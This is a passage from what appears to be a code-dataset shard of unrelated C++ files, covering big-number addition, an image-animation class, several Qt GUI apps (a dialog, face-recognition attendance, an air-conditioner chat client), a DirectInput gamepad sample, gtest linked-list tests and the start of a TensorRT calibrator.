small[i]);\r\n\r\n\tfor (i = 0; i < big.length(); i++)\r\n\t{\r\n\t\tbig[i + 1] = big[i + 1] + big[i] / 10;\r\n\t\tbig[i] %= 10;\r\n\t\tbig[i] += '0';\r\n\t}\r\n\r\n\treverse(big.begin(), big.end());\r\n\r\n\tif (big[0] == '0') big.erase(0, 1);\r\n\r\n\tcout << big << endl;\r\n}\r\n\r\n\r\n/*\r\n\u7e3d\u7d50\r\n\u9019\u500b\u7a0b\u5f0f\u78bc\u7684\u6d41\u7a0b\u5c31\u662f\uff1a\r\n\r\n\u8f38\u5165\u5169\u500b\u5927\u6578\u5b57\u5b57\u4e32\u3002\r\n\u6839\u64da\u5927\u5c0f\u6c7a\u5b9a\u9806\u5e8f\uff0c\u4e26\u53cd\u8f49\u5b57\u4e32\u3002\r\n\u5c07\u5b57\u5143\u8f49\u6210\u6578\u5b57\u5f8c\u9010\u4f4d\u76f8\u52a0\u3002\r\n\u8655\u7406\u9032\u4f4d\u3002\r\n\u53cd\u8f49\u56de\u4f86\u4e26\u8f38\u51fa\u7d50\u679c\u3002\r\n\u5e0c\u671b\u9019\u6a23\u7684\u8aaa\u660e\u8b93\u4f60\u66f4\u4e86\u89e3\u9019\u6bb5\u7a0b\u5f0f\u78bc\uff01\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n*/",
    "/**\n * @file animation.cpp\n *\n * Implementation of an animation class.\n * @author Aria Buckles\n * @date Fall 2011\n */\n\n#include <stdlib.h>\n#include <sys/stat.h>\n#include <iostream>\n#include <sstream>\n#include <string>\n#include \"animation.h\"\n\nusing namespace std;\n\ntemplate <typename T>\ninline string animation::to_string(const T& value)\n{\n    stringstream ss;\n    ss << value;\n    return ss.str();\n}\n\nstring animation::getString(int i, int padToSameLengthAs)\n{\n    string istr = to_string(i);\n    string padstr = to_string(padToSameLengthAs);\n    return string(padstr.length() - istr.length(), '0') + istr;\n}\n\nbool animation::exists(const string& path)\n{\n    // Try stat-ing it\n    struct stat st;\n    if (stat(path.c_str(), &st) != 0)\n        return false;\n    // Check for read permission\n    if ((st.st_mode & S_IRUSR) == 0)\n        return false;\n\n    // Check for correct file/directory nature\n    if (path[path.length() - 1] != '/')\n        return S_ISREG(st.st_mode);\n\n    // Otherwise we want a directory\n    if ((st.st_mode & S_IXUSR) == 0)\n        return false;\n    return S_ISDIR(st.st_mode);\n}\n\nvoid animation::addFrame(PNG const& img)\n{\n    frames.push_back(img);\n}\n\nPNG animation::write(const std::string& filename)\n{\n    if (frames.empty()) {\n        cout << \"Animation Warning: No frames added!\" << endl;\n        return PNG();\n    }\n    size_t filestart = filename.find_last_of(\"/\");\n    filestart = (filestart == string::npos) ? 0 : filestart + 1;\n    size_t extstart = filename.find_last_of(\".\");\n    string name = filename.substr(filestart, extstart - filestart);\n\n    // Create the frames/ directory if it does not exist\n    if (!exists(\"frames/\"))\n        mkdir(\"frames\", 0700);\n\n    // Remove all previous frames from this image\n    system((\"ls frames | grep '^\" + name + \".*\\\\.png$' | xargs -I% rm -f frames/%\").c_str());\n\n    // Generate Frames\n    for (size_t i = 0; i < frames.size(); i++)\n        frames[i].writeToFile((\"frames/\" + name + getString(i, frames.size()) + \".png\").c_str());\n\n    // Combine frames\n    system((\"convert frames/\" + name + \"*.png \" + filename).c_str());\n    return frames[frames.size()-1];\n}\n",
    "#include \"deletefrienddialog.h\"\r\n#include \"ui_deletefrienddialog.h\"\r\n\r\nDeleteFriendDialog::DeleteFriendDialog(QWidget *parent)\r\n    : QDialog(parent)\r\n    , ui(new Ui::DeleteFriendDialog)\r\n{\r\n    ui->setupUi(this);\r\n    //\u521d\u59cb\u5316\u7a97\u53e3\r\n    QIcon icon(\":/pictures/suliao.png\");\r\n    setWindowIcon(icon);\r\n    setWindowFlags( Qt::FramelessWindowHint | Qt::Dialog);\r\n    setAttribute(Qt::WA_TranslucentBackground);//\u5141\u8bb8\u80cc\u666f\u900f\u660e\r\n    //\u5c06\u7a97\u53e3\u5c45\u4e2d\u663e\u793a\r\n    if (parent) {\r\n        int x = parent->x() + (parent->width() - width()) / 2;\r\n        int y = parent->y() + (parent->height() - height()) / 2;\r\n        move(x, y);\r\n    }\r\n}\r\n\r\n\r\nDeleteFriendDialog::~DeleteFriendDialog()\r\n{\r\n    delete ui;\r\n    this->disconnect();\r\n}\r\n\r\n\r\nvoid DeleteFriendDialog::paintEvent(QPaintEvent *event)//\u7a97\u53e3\u80cc\u666f\r\n{\r\n    //\u8c03\u7528\u57fa\u7c7b\u65b9\u6cd5\u4ee5\u5904\u7406\u7236\u7c7b\u7684\u7ed8\u56fe\r\n    QDialog::paintEvent(event);\r\n    QPainter painter(this);\r\n    //\u8bbe\u7f6e\u5706\u89d2\u534a\u5f84\r\n    int radius = 4;//\u5706\u89d2\u534a\u5f84\r\n    //\u8bbe\u7f6e\u80cc\u666f\u989c\u8272\r\n    painter.setBrush(QBrush(QColor(255, 255, 255)));\r\n    //\u7ed8\u5236\u5706\u89d2\u77e9\u5f62\u80cc\u666f\r\n    painter.drawRoundedRect(rect(), radius, radius);\r\n}\r\n\r\n\r\nvoid DeleteFriendDialog::on_but_delete_clicked()//\u53d6\u6d88\u5220\u9664\u64cd\u4f5c \u5173\u95ed\u7a97\u53e3\r\n{\r\n    this->disconnect();\r\n    this->close();\r\n}\r\n\r\n\r\nvoid DeleteFriendDialog::on_but_cacel_clicked()//\u70b9\u51fb\u786e\u5b9a\u53d1\u9001\u4fe1\u53f7\r\n{\r\n    emit deleteYes();\r\n}\r\n\r\n",
    "\ufeff/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n///\n///\n/// GamePad\u5236\u5fa1\u30b5\u30f3\u30d7\u30eb\n/// \n/// Main: GamePadRunSample.cpp\n/// \n/// static std::atomic<DIJOYSTATE2>* GamePadOBJtOutMode = new std::atomic<DIJOYSTATE2>();\n/// \u7d50\u679c\u304c\u5165\u3063\u3066\u304f\u308b\n/// \n/// \n///\t\n///   \u5c65\u6b74\t\n///   2024/10/15 V1.00 First\n///\n///\n///                        Copyright(c) 2024, Retar.jp, All Rights Reserved.\n///                        http://www.retar.jp/\n/// \n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n#include \"GamePad.h\"\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n//#pragma comment(lib, \"XInput.lib\")\t\t\t//\u53e4\u3044PS2\u30b2\u30fc\u30e0\u30b3\u30f3\u30c8\u30ed\u30fc\u30e9\u30fc\u3089\u3057\u3044\n#pragma comment(lib, \"dinput8.lib\")\n#pragma comment(lib, \"dxguid.lib\")\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n//GamePad\u4f7f\u7528\u53ef\u80fd\u72b6\u614b TRUE->\u4f7f\u7528\u53ef\u80fd FALSE->\u4f7f\u7528\u4e0d\u53ef\u80fd\nstatic std::atomic<bool>* GamePadOBJeFlag = new std::atomic<bool>();\n//GamePad\u66f4\u65b0\u6642\u9593\nstatic int GamePadOBJrenewTime = 5;\n//GamePad\u30ea\u30bf\u30fc\u30f3\nstatic std::atomic<DIJOYSTATE2>* GamePadOBJtOutMode = new std::atomic<DIJOYSTATE2>();\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\nint main()\n{\n\t/////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\t//GamePad INIT -> TRUE\u306b\u3059\u308b\n\t*GamePadOBJeFlag = TRUE;\n\t/////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\t//GamePad Setting\n\tGanePadOBJ GamePadOBJWrapperInstance(\n\t\tGamePadOBJeFlag\n\t\t, GamePadOBJrenewTime\n\t\t, GamePadOBJtOutMode\n\t);\n\t// std::thread\u30b3\u30f3\u30b9\u30c8\u30e9\u30af\u30bf\u306b\u5f15\u6570\u3092\u6e21\u3057\u3066\u30b9\u30ec\u30c3\u30c9\u3092\u958b\u59cb\n\tstd::thread InputThread(&GanePadOBJ::InputThread, &GamePadOBJWrapperInstance);\n\t/////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\tstd::cout << \"Game Pad : Start \" << std::endl;\n\t/////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\twhile (*GamePadOBJeFlag)\n\t{\n\t\t/////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\t\t//\u30b2\u30fc\u30e0\u30b3\u30f3\u30c8\u30ed\u30fc\u30e9\u30fc\u306e\u30b9\u30c6\u30fc\u30bf\u30b9\n\t\t*GamePadOBJeFlag = GamePadOBJWrapperInstance.getGamePadStats();\n\t\t/////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\t\t//\u7d42\u4e86\n\t\tif (GetAsyncKeyState(VK_ESCAPE) & 0x8000)\n\t\t{\n\t\t\t*GamePadOBJeFlag = FALSE;\n\t\t}\n\t\t/////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\t\t//// X\u79d2\u9593\u30d7\u30ed\u30b0\u30e9\u30e0\u3092\u505c\u6b62 =>\u30b9\u30ec\u30c3\u30c9\u3067\u5165\u308c\u306a\u3044\u3068\u96fb\u6c17\u98df\u3044\u306b\u306a\u308a\u307e\u3059\n\t\tstd::chrono::milliseconds sleepDuration(GamePadOBJrenewTime);\n\t\tstd::this_thread::sleep_for(sleepDuration);\n\t\t/////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\t}\n\t/////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\t//\u30b9\u30ec\u30c3\u30c9\u3092join\u3057\u3066\u304b\u3089\u7d42\u4e86\u3055\u305b\u306a\u3044\u3068\u30a8\u30e9\u30fc\u306b\u306a\u308b -> \u81ea\u52d5\u958b\u653e\u3055\u308c\u306a\u3044\n\tif (InputThread.joinable())\n\t{\n\t\tInputThread.join();\n\t}\n\t/////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\tstd::cout << \"Game Pad : End \" << std::endl;\n\t/////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\t//\u30b9\u30ec\u30c3\u30c9\u306e\u7d42\u4e86\u3092\u4e00\u5b9a\u7a0b\u5ea6\u5f85\u3064\n\tstd::chrono::milliseconds sleepDuration(4000);\n\tstd::this_thread::sleep_for(sleepDuration);\n\tGamePadOBJWrapperInstance.deinitGamePad();\n\t/////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n}\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n",
    "#include \"attendancewin.h\"\n#include \"selectwin.h\"\n#include <QApplication>\n#include <QDateTime>\n#include <QDir>\n#include <QFile>\n#include <QSqlDatabase>\n#include <QSqlError>\n#include <QSqlQuery>\n#include <QTime>\n#include \"registerwin.h\"\nint main(int argc, char *argv[])\n{\n\n    QString state;\n    // \u83b7\u53d6\u5f53\u524d\u65f6\u95f4\n    QDateTime currentTime = QDateTime::currentDateTime();\n    QTime time = currentTime.time();\n\n    QApplication a(argc, argv);\n\n    qRegisterMetaType<cv::Mat>(\"cv::Mat&\");\n    qRegisterMetaType<cv::Mat>(\"cv::Mat\");\n    qRegisterMetaType<int64_t>(\"int64_t\");\n\n    //\u8fde\u63a5\u6570\u636e\u5e93\n    QSqlDatabase db = QSqlDatabase::addDatabase(\"QSQLITE\");\n    //\u8bbe\u7f6e\u6570\u636e\u540d\u79f0\n    db.setDatabaseName(\"server.db\");//\u670d\u52a1\u5668\u6570\u636e\u5e93\uff0c\u4f1a\u5305\u542b\u4e24\u4e2a\u8868\uff1a\u5458\u5de5\u8868\u4e0e\u8003\u52e4\u8868\n    //\u6253\u5f00\u6570\u636e\u5e93\n    if(!db.open())\n    {\n        //\u6253\u5f00\u6570\u636e\u5e93\u5931\u8d25\n        qDebug()<<db.lastError().text();\n        return -1;\n    }\n\n    //\u521b\u5efa\u5b66\u751f\u4fe1\u606f\u8868\u683c\n    QString createsql = \"create table if not exists student(studentID integer primary key autoincrement,name varchar(256),sex varchar(32),\"\n                        \"number text, school text, dormitory_number text, phone_number text, faceID integer unique, headfile text)\";\n    QSqlQuery query;\n    if(!query.exec(createsql))\n    {\n        // \u5458\u5de5\u4fe1\u606f\u8868\u6570\u636e\u5e93\u8868\u521b\u5efa\u5931\u8d25\uff0c\u6253\u5370\u9519\u8bef\u4fe1\u606f\u540e\u63a8\u51fa\n        qDebug()<<query.lastError().text();\n        return -1;\n    }\n\n    // \u521b\u5efa\u5237\u8138\u4fe1\u606f\u8868\u683c\n    createsql = \"create table if not exists attendance(attendanceID integer primary key autoincrement, studentID integer, name varchar(256),\"\n                \"attendanceTime TimeStamp NOT NULL DEFAULT(datetime('now','localtime')),state varchar(32))\";//\u65f6\u95f4\u8bbe\u7f6e\u9ed8\u8ba4\u4e8b\u4ef6\u4e3a\u5f53\u524d\u7cfb\u7edf\u65f6\u95f4\n    if(!query.exec(createsql))\n    {\n        // \u8003\u52e4\u8868\u6570\u636e\u5e93\u8868\u521b\u5efa\u5931\u8d25\uff0c\u6253\u5370\u9519\u8bef\u4fe1\u606f\u540e\u63a8\u51fa\n        qDebug()<<query.lastError().text();\n        return -1;\n    }\n\n    AttendanceWin w;\n    w.show();\n\n    return a.exec();\n}\n",
    "//\uc5d0\uc5b4\ucee8 \uad00\ub9ac \ucc44\ud305\ubc29 (chatwindow1)\n\n#include \"chatwindow1.h\"\n#include \"ui_chatwindow1.h\"\n\nChatWindow1::ChatWindow1(QString id, int channel, QWidget *parent):\n    QWidget(parent),\n    ui(new Ui::ChatWindow1), socket(new QTcpSocket(this)), id(id), channel(channel)\n{\n    ui->setupUi(this);\n    setWindowTitle(\"Channel \" + QString::number(channel));  // \ucc44\ub110 \ubc88\ud638\ub97c \ucc3d \uc81c\ubaa9\uc73c\ub85c \uc124\uc815\n    connectToServer(\"127.0.0.1\", 12345); // \ucc44\ud305\ubc29\uacfc \uc11c\ubc84 \uc5f0\uacb0\n    connect(socket, &QTcpSocket::readyRead, this, &ChatWindow1::readServerData); // \uc18c\ucf13\uc744 \uc774\uc6a9\ud574 \uc11c\ubc84\ub85c\ubd80\ud130 \uba54\uc138\uc9c0 \uc218\uc2e0\n\n    airconState = false;\n    ui->airconOFF->setStyleSheet(\"background-color: rgb(216, 213, 255); color: black;\");\n    ui->airconON->setStyleSheet(\"\");  // ON \ubc84\ud2bc \uc0c9\uc0c1 \ucd08\uae30\ud654\n    ui->dial->setEnabled(false); // \ub2e4\uc774\uc5bc \uc870\uc791 \ubd88\uac00\ub2a5\ud558\uac8c \uc124\uc815\n    ui->windBox->setEnabled(false); // \ub2e4\uc774\uc5bc \uc870\uc791 \ubd88\uac00\ub2a5\ud558\uac8c \uc124\uc815\n}\n\nChatWindow1::~ChatWindow1()\n{\n    delete ui;\n}\n\n//\uc5d0\uc5b4\ucee8 \uc628\ub3c4 \uc870\uc808 \ub2e4\uc774\uc5bc\nvoid ChatWindow1::on_dial_valueChanged(int value)\n{\n    if (!airconState) {  // \uc5d0\uc5b4\ucee8\uc774 \uaebc\uc9c4 \uc0c1\ud0dc\ub77c\uba74\n        qDebug() << \"Airconditioning is OFF. Dial cannot be changed.\";\n        return;\n    }\n    // \ub2e4\uc774\uc5bc \uac12\uc774 \ubcc0\uacbd\ub418\uba74 \uc11c\ubc84\ub85c \uba54\uc2dc\uc9c0 \uc804\uc1a1\n    QString dialMessage = \"<span style='font-weight:bold;color:rgb(0,0,255);'>\" + id + \"</span> : \"  + QString::number(channel) + \" : Temperature changed -> \" + QString::number(value)+ \"\u2103\";\n    sendMessage(dialMessage);  // \uc11c\ubc84\ub85c \ub2e4\uc774\uc5bc \uac12 \uc804\uc1a1\n}\n\n\n//\uba54\uc2dc\uc9c0 \uc804\uc1a1 \ubc84\ud2bc\uc774 \ub20c\ub7ec\uc9c0\uba74\nvoid ChatWindow1::on_sendButton_clicked()\n{\n    if (ui->messageInput->text().isEmpty()) {                           // \uba54\uc2dc\uc9c0\uac00 \ube44\uc5b4 \uc788\ub294\uc9c0 \ud655\uc778\n        qDebug() << \"Message input is empty. Not sending.\";         // \ub85c\uadf8 \ucd9c\ub825\n        return;                                                     // \ube44\uc5b4 \uc788\uc744 \uacbd\uc6b0 \uc804\uc1a1 x\n    }\n    sendMessage(\"<span style='font-weight:bold;color:rgb(0,0,255);'>\" + id + \"</span> : \" + QString::number(channel) + \" : \"  + ui->messageInput->text());\n    ui->messageInput->clear();                                          // \uba54\uc138\uc9c0 \uc785\ub825\ucc3d \ucd08\uae30\ud654\n\n}\n\nvoid ChatWindow1::connectToServer(const QString &host, quint16 port) {    // \ud638\uc2a4\ud2b8(\uc11c\ubc84) ip\uc640 \ud3ec\ud2b8 \ubc88\ud638 \uc774\uc6a9\ud574\uc11c \uc11c\ubc84\uc5d0 \uc811\uc18d\n    socket->connectToHost(host, port);                                   // \ucc44\ud305\ubc29 \uc18c\ucf13 \uc774\uc6a9\ud574\uc11c \uc11c\ubc84\uc5d0 \uc811\uc18d\ud558\uae30\n    if (socket->waitForConnected()) {                                    // \uc811\uc18d \ub85c\uadf8 \ucd9c\ub825\n        qDebug() << \"ChatWindow connected to server!\";\n    }\n    else {\n        qDebug() << \"ChatWindow failed to connect to server!\";\n    }\n}\n\nvoid ChatWindow1::sendMessage(const QString &message) {                  // \ucc44\ud305\ubc29\uc5d0\uc11c \uc11c\ubc84\ub85c \ucc44\ud305 \uba54\uc138\uc9c0 \uc804\uc1a1\n    if (socket->state() == QAbstractSocket::ConnectedState) {           // \uc18c\ucf13\uc774 \uc11c\ubc84\uc5d0 \uc5f0\uacb0\ub41c \uc0c1\ud0dc\ub77c\uba74\n        socket->write(message.toUtf8());                                // string \ubcc0\ud658\ud574\uc11c \uc11c\ubc84\ub85c \uc804\uc1a1\n        qDebug() << \"ChatWindow sent message:\" << message;              // \uc804\uc1a1 \ub85c\uadf8 \ucd9c\ub825\n    }\n    else {\n        qDebug() << \"ChatWindow not connected to server!\";\n    }\n}\n\nvoid ChatWindow1::readServerData() {                                     // \uc11c\ubc84\ub85c\ubd80\ud130 \uba54\uc138\uc9c0 \uc218\uc2e0\n    QByteArray data = socket->readAll();                                // \uc18c\ucf13 \ud1b5\ud574\uc11c \uc11c\ubc84\uc5d0\uc11c \ubcf4\ub0b8 \ub370\uc774\ud130 \uc77d\uae30\n    qDebug() << \"ChatWindow received from server:\" << data;             // \uc218\uc2e0 \uc644\ub8cc \ub85c\uadf8\n    QString message = QString::fromUtf8(data);                          // \uc218\uc2e0 \ub370\uc774\ud130\ub97c QString\uc73c\ub85c \ubcc0\ud658\n\n    QStringList messageParts = message.split(\" : \");                    // \uba54\uc2dc\uc9c0\ub97c \":\"\ub85c \ubd84\ub9ac\ud558\uc5ec \ucc44\ub110 \uc815\ubcf4 \ud655\uc778\n    if (messageParts.size() >= 3) {                                     // \uba54\uc2dc\uc9c0 \ud615\uc2dd\uc774 \uc62c\ubc14\ub978\uc9c0 \ud655\uc778\n        QString senderId = messageParts[0];                             // \ubc1c\uc2e0\uc790 ID\n        int receivedChannel = messageParts[1].toInt();                  // \uc1a1\uc2e0\ud55c \ucc44\ub110 \ubc88\ud638\n        QString content = messageParts[2];                              // \uc1a1\uc2e0\ud55c \uba54\uc2dc\uc9c0 \ub0b4\uc6a9\n\n        if (receivedChannel == channel) {                                   // \uc1a1\uc2e0\uc790 \ucc44\ub110\uacfc \uc218\uc2e0\uc790 \ucc44\ub110\uc774 \uac19\uc740 \uacbd\uc6b0\uc5d0\ub9cc \ucd9c\ub825\n            //ui->messageDisplay->appendPlainText(\" \"+senderId + \" : \" + content);    // \uc1a1\uc2e0\uc790 \uc544\uc774\ub514\uc640 \uba54\uc138\uc9c0 \ucd9c\ub825\n            if (content == \"Airconditioning ON!\") {\n                ui->dial->setEnabled(true);  // \uc5d0\uc5b4\ucee8 \ucf1c\uc9d0 \uc0c1\ud0dc\ub85c \uc124\uc815\n                ui->messageDisplay->append(\" \" + senderId + \" : \" + content);  // \ucc44\ud305 \uba54\uc2dc\uc9c0 \ucd9c\ub825\n                ui->airconON->setStyleSheet(\"background-color: rgb(255, 170, 127); color: black;\");\n                ui->airconOFF->setStyleSheet(\"\");  // OFF \ubc84\ud2bc \uc0c9\uc0c1 \ucd08\uae30\ud654\n                airconState = true;  // \uc5d0\uc5b4\ucee8 \uc0c1\ud0dc \uc5c5\ub370\uc774\ud2b8\n            } else if (content == \"Airconditioning OFF!\") {\n                ui->dial->setEnabled(false);  // \uc5d0\uc5b4\ucee8 \uaebc\uc9d0 \uc0c1\ud0dc\ub85c \uc124\uc815\n                ui->messageDisplay->append(\" \" + senderId + \" : \" + content);  // \ucc44\ud305 \uba54\uc2dc\uc9c0 \ucd9c\ub825\n                ui->airconOFF->setStyleSheet(\"background-color: rgb(216, 213, 255); color: black;\");\n                ui->airconON->setStyleSheet(\"\");  // ON \ubc84\ud2bc \uc0c9\uc0c1 \ucd08\uae30\ud654\n                airconState = false;  // \uc5d0\uc5b4\ucee8 \uc0c1\ud0dc \uc5c5\ub370\uc774\ud2b8\n            }else {\n                ui->messageDisplay->append(\" \" + senderId + \" : \" + content);  // \ucc44\ud305 \uba54\uc2dc\uc9c0 \ucd9c\ub825\n            }\n        }\n    }\n}\n\nvoid ChatWindow1::on_airconON_clicked()\n{\n    airconState = true;  // \uc5d0\uc5b4\ucee8\uc774 \ucf1c\uc9d0\n    QString airconStateMessage = \"<span style='font-weight:bold;color:rgb(0,0,255);'>\" + id + \"</span> : \"+QString::number(c",
    "#include <gtest/gtest.h>\n#include \"LinkedList.cpp\"\n\nTEST(LinkedListTest, InstantiateEmptyList)\n{\n    LinkedList<int> llist;\n\n    ASSERT_EQ(llist.head(), nullptr);\n    ASSERT_EQ(llist.tail(), nullptr);\n    ASSERT_EQ(llist.size(), 0);\n}\n\nTEST(LinkedListTest, InstantiateFromVector)\n{\n    LinkedList<int> llist(std::vector<int>{17, 19, 23});\n\n    ASSERT_EQ(llist.size(), 3);\n\n    LinkedListNode<int> *node = llist.head();\n    ASSERT_EQ(node->value, 17);\n    ASSERT_EQ(node->next()->value, 19);\n    ASSERT_EQ(node->next()->next()->value, 23);\n    ASSERT_EQ(node->next()->next()->next(), nullptr);\n}\n\nTEST(LinkedListTest, AppendToEmptyList)\n{\n    LinkedList<int> llist;\n    LinkedListNode<int> *node = llist.append(17);\n\n    ASSERT_EQ(node, llist.head());\n    ASSERT_EQ(node, llist.tail());\n    ASSERT_EQ(node->value, 17);\n    ASSERT_EQ(node->next(), nullptr);\n    ASSERT_EQ(llist.size(), 1);\n}\n\nTEST(LinkedListTest, AppendToNonEmptyList)\n{\n    LinkedList<int> llist;\n    LinkedListNode<int> *first = llist.append(17);\n    LinkedListNode<int> *second = llist.append(19);\n\n    ASSERT_EQ(first, llist.head());\n    ASSERT_EQ(first->value, 17);\n    ASSERT_EQ(first->next(), second);\n\n    ASSERT_EQ(second, llist.tail());\n    ASSERT_EQ(second->value, 19);\n    ASSERT_EQ(second->next(), nullptr);\n\n    ASSERT_EQ(llist.size(), 2);\n}\n\nTEST(LinkedListTest, AppendToNonEmptyList111)\n{\n    LinkedList<int> llist;\n    LinkedListNode<int> *first = llist.append(17);\n    LinkedListNode<int> *second = llist.append(19);\n    ASSERT_EQ(llist.remove(17), true);\n}\n\nTEST(LinkedListTest, AppendToNonEmptyList121)\n{\n    LinkedList<int> llist;\n    LinkedListNode<int> *first = llist.append(17);\n    LinkedListNode<int> *second = llist.append(19);\n    ASSERT_EQ(llist.removeHead(), 17);\n}\n\nTEST(LinkedListTest, AppendToNonEmptyList1221)\n{\n    LinkedList<int> llist;\n    LinkedListNode<int> *first = llist.append(17);\n    LinkedListNode<int> *second = llist.prepend(19);\n    ASSERT_EQ(llist.removeHead(), 19);\n}\n\n// TODO: Add more tests for LinkedList here\nTEST(LinkedListTest, PrependToEmptyList)\n{\n    LinkedList<int> llist;\n    LinkedListNode<int> *node = llist.prepend(42);\n\n    ASSERT_EQ(node, llist.head());\n    ASSERT_EQ(node, llist.tail());\n    ASSERT_EQ(node->value, 42);\n    ASSERT_EQ(node->next(), nullptr);\n    ASSERT_EQ(llist.size(), 1);\n}\n\nTEST(LinkedListTest, PrependToNonEmptyList)\n{\n    LinkedList<int> llist;\n    LinkedListNode<int> *first = llist.append(17);\n    LinkedListNode<int> *second = llist.prepend(42);\n\n    ASSERT_EQ(second, llist.head());\n    ASSERT_EQ(second->value, 42);\n    ASSERT_EQ(second->next(), first);\n\n    ASSERT_EQ(first, llist.tail());\n    ASSERT_EQ(first->value, 17);\n    ASSERT_EQ(first->next(), nullptr);\n\n    ASSERT_EQ(llist.size(), 2);\n}\n\nTEST(LinkedListTest, InsertAfterNullptr)\n{\n    LinkedList<int> llist;\n    LinkedListNode<int> *node = llist.insertAfter(nullptr, 99);\n\n    ASSERT_EQ(node, llist.head());\n    ASSERT_EQ(node, llist.tail());\n    ASSERT_EQ(node->value, 99);\n    ASSERT_EQ(node->next(), nullptr);\n    ASSERT_EQ(llist.size(), 1);\n}\n\nTEST(LinkedListTest, InsertAfterHead)\n{\n    LinkedList<int> llist;\n    LinkedListNode<int> *first = llist.append(17);\n    LinkedListNode<int> *second = llist.insertAfter(first, 23);\n\n    ASSERT_EQ(first, llist.head());\n    ASSERT_EQ(first->next(), second);\n    ASSERT_EQ(second, llist.tail());\n    ASSERT_EQ(second->value, 23);\n    ASSERT_EQ(second->next(), nullptr);\n    ASSERT_EQ(llist.size(), 2);\n}\n\nTEST(LinkedListTest, FindElementInList)\n{\n    LinkedList<int> llist(std::vector<int>{17, 19, 23});\n\n    LinkedListNode<int> *node = llist.find(19);\n    ASSERT_NE(node, nullptr);\n    ASSERT_EQ(node->value, 19);\n}\n\nTEST(LinkedListTest, FindElementNotInList)\n{\n    LinkedList<int> llist(std::vector<int>{17, 19, 23});\n\n    LinkedListNode<int> *node = llist.find(42);\n    ASSERT_EQ(node, nullptr);\n}\n\nTEST(LinkedListTest, RemoveElementFromMiddle)\n{\n    LinkedList<int> llist(std::vector<int>{17, 19, 23});\n\n    bool removed = llist.remove(19);\n    ASSERT_TRUE(removed);\n    ASSERT_EQ(llist.size(), 2);\n\n    LinkedListNode<int> *node = llist.head();\n    ASSERT_EQ(node->value, 17);\n    ASSERT_EQ(node->next()->value, 23);\n    ASSERT_EQ(node->next()->next(), nullptr);\n}\n\nTEST(LinkedListTest, RemoveElementNotFound)\n{\n    LinkedList<int> llist(std::vector<int>{17, 19, 23});\n\n    bool removed = llist.remove(99);\n    ASSERT_FALSE(removed);\n    ASSERT_EQ(llist.size(), 3);\n}\n\nTEST(LinkedListTest, ClearList)\n{\n    LinkedList<int> llist(std::vector<int>{17, 19, 23});\n    llist.clear();\n\n    ASSERT_EQ(llist.size(), 0);\n    ASSERT_EQ(llist.head(), nullptr);\n    ASSERT_EQ(llist.tail(), nullptr);\n}\n\nTEST(LinkedListTest, MoveConstructor)\n{\n    LinkedList<int> llist1(std::vector<int>{17, 19, 23});\n    LinkedList<int> llist2(std::move(llist1));\n\n    ASSERT_EQ(llist1.size(), 0);\n    ASSERT_EQ(llist1.head(), nullptr);\n    ASSERT_EQ(llist1.tail(), nullptr);\n\n    ASSERT_EQ(llist2.size(), 3);\n    LinkedListNode<int> *node = llist2.head();\n ",
    "//\n// Created by dpw on 24-2-29.\n//\n\n#include \"NvOnnxParser.h\"\n#include \"spdlog/spdlog.h\"\n\n#include \"iostream\"\n#include <ostream>\n#include <fstream>\n#include <iterator>\n\n#include \"common_utils.h\"\n#include \"tensorrt_utils.h\"\n#include \"opencv_image_utils.h\"\n#include \"yolov5_trt_calibrator.h\"\n\n/**\n * @brief \u8fd9\u662fYOLOv5\u6a21\u578bTensorRT\u6821\u51c6\u7c7b\u7684\u6784\u9020\u51fd\u6570\n * @param batch_size \u5c0f\u6279\u91cf\u6570\u636e\u89c4\u6a21\n * @param input_height \u8f93\u5165\u9ad8\u5ea6\n * @param input_width \u8f93\u5165\u5bbd\u5ea6\n * @param input_channel \u8f93\u5165\u901a\u9053\u6570\n * @param input_name \u8f93\u5165\u8282\u70b9\u540d\u79f0\n * @param is_nchw onnx\u6a21\u578b\u8f93\u5165\u8282\u70b9\u662f\u5426\u4e3aNCHW\u683c\u5f0f\n * @param use_normlize onnx\u6a21\u578b\u662f\u5426\u4f7f\u7528\u6570\u636e\u5f52\u4e00\u5316\n * @param calibrator_image_dir \u6821\u51c6\u56fe\u50cf\u96c6\u76ee\u5f55\u5730\u5740\n * @param calibrator_table_path \u6821\u51c6\u91cf\u5316\u8868\u8def\u5f84\n * @param input_data_type \u6a21\u578b\u8f93\u5165\u8282\u70b9\u6570\u636e\u7c7b\u578b\n */\nYOLOv5Int8EntropyCalibrator::YOLOv5Int8EntropyCalibrator(int batch_size, int input_height, int input_width, int input_channel,\n                                                         bool is_nchw,bool use_normlize,std::string calibrator_image_dir,\n                                                         std::string calibrator_table_path,std::string input_data_type){\n    // \u521d\u59cb\u5316\u76f8\u5173\u53c2\u6570\n    this->batch_size = batch_size;\n    this->input_height = input_height;\n    this->input_width = input_width;\n    this->input_channel = input_channel;\n    this->is_nchw = is_nchw;\n    this->use_normlize = use_normlize;\n    this->input_size = this->input_height*this->input_width*this->input_channel;\n    this->calibrator_image_dir = calibrator_image_dir;\n    this->calibrator_table_path = calibrator_table_path;\n    this->image_index = 0;\n    // \u521d\u59cb\u5316\u6570\u636e\u7c7b\u578b\u5927\u5c0f\n    if(input_data_type == \"float16\"){\n        this->input_data_type_size = 2;\n    } else{\n        this->input_data_type_size = 4;\n    }\n\n    // \u82e5\u6821\u51c6\u8868\u4e0d\u5b58\u5728\u5219\u521d\u59cb\u5316\u6821\u51c6\u56fe\u50cf\u8def\u5f84\n    if(!is_file_exists(this->calibrator_table_path)){\n        // 